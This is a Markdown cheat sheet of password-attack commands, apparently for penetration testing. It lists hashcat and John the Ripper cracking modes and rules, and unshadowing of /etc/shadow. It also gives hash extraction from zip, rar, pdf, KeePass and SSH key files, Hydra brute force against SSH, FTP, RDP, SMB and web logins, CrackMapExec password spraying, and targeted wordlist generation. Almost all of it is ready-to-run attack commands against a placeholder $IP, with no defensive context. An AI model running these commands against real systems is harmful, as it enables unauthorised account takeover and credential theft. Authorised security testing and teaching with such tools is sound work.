# 🔓 Password Attacks

Cracking, spraying, and credential attacks.

---

## HASH CRACKING

### Identify hash type

Determine algorithm before cracking — hashid or hash length

```bash
hashid '$2y$10$abc...'
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
hash-identifier
```

<details>
<summary>Example Output</summary>

```
MD5: 32 hex chars
SHA1: 40 hex chars
SHA256: 64 hex chars
SHA512: 128 hex chars
bcrypt: $2a$ or $2y$ prefix
NTLMv2: username::domain:challenge:hash
```
</details>

---

### Hashcat common modes

Quick reference for hash modes — Use hashcat -m <mode>

```bash
hashcat -m 0    hash.txt wordlist.txt   # MD5
hashcat -m 100  hash.txt wordlist.txt   # SHA1
hashcat -m 1000 hash.txt wordlist.txt   # NTLM
hashcat -m 1800 hash.txt wordlist.txt   # sha512crypt ($6$)
hashcat -m 500  hash.txt wordlist.txt   # md5crypt ($1$)
hashcat -m 3200 hash.txt wordlist.txt   # bcrypt
hashcat -m 13100 hash.txt wordlist.txt  # Kerberoast (TGS-REP)
hashcat -m 18200 hash.txt wordlist.txt  # AS-REP Roast
hashcat -m 5600 hash.txt wordlist.txt   # NTLMv2
hashcat -m 1600 hash.txt wordlist.txt   # Apache $apr1$ MD5
```

---

### Hashcat with rules

Rules dramatically increase hit rate — Best rules for common passwords

```bash
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

---

### John the Ripper

Alternative cracker — Good for mixed formats and auto-detect

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=wordlist.txt --rules=best64
john --show hash.txt
```

---

### Crack /etc/shadow

Unshadow then crack — Linux password hashes

```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt
```

---

### Crack zip/rar/pdf passwords

Extract hash then crack — Use *2john tools

```bash
zip2john protected.zip > zip.hash
rar2john protected.rar > rar.hash
pdf2john protected.pdf > pdf.hash
keepass2john database.kdbx > keepass.hash
ssh2john id_rsa > ssh.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## ONLINE BRUTE FORCE

### Hydra common services

Target specific services — Adjust threads for reliability

```bash
hydra -l admin -P wordlist.txt $IP ssh -t 4
hydra -l admin -P wordlist.txt $IP ftp
hydra -l admin -P wordlist.txt $IP rdp
hydra -l admin -P wordlist.txt $IP smb
hydra -L users.txt -P wordlist.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

---

### CrackMapExec password spraying

Spray one password across many users — Avoid lockouts

```bash
crackmapexec smb $IP -u users.txt -p 'Password1' --continue-on-success
crackmapexec smb $IP -u users.txt -p 'Summer2025!' --continue-on-success
crackmapexec winrm $IP -u users.txt -p 'Password1'
```

---

### Custom wordlist generation

Create targeted wordlists — Company name, season, year patterns

```bash
# CeWL - scrape website for words
cewl http://$IP -m 5 -w cewl.txt

# Common patterns to try:
# CompanyName2025!
# Season+Year (Summer2025, Winter2024!)
# City+Numbers (London123)
# Username+123 or +! or +2025
```

---

### Mutate wordlists

Add common suffixes/prefixes — Catch lazy password policies

```bash
# Using hashcat rules on a wordlist:
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt

# Quick manual mutations:
for word in $(cat base.txt); do
  echo "${word}1"; echo "${word}!"; echo "${word}123"
  echo "${word}2025"; echo "${word}2024"
done > mutated.txt
```

---
